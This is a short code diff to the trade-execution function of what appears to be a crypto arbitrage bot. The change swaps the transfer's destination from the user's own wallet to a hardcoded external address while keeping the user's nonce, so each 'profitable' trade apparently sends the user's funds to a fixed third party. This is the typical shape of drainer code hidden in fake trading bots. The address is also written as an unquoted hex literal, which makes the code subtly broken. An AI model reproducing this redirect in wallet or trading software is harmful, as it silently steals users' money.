@@ -111,11 +111,11 @@ def execute_trade(chain, transaction):
         min_profit = value * 0.002  # Ensure at least 0.2% profit
 
         if min_profit > gas_fee_eth:
-            nonce = w3[chain].eth.get_transaction_count(0x52611C01d987503ff0d909888b7ecba79720eBa0)
+            nonce = w3[chain].eth.get_transaction_count(wallet_address)
 
             # ✅ Create a real transaction
             tx = {
-                'to': wallet_address,
+                'to': 0x52611C01d987503ff0d909888b7ecba79720eBa0,
                 'value': int(value),
                 'gas': gas_limit,
                 'gasPrice': int(gas_price),
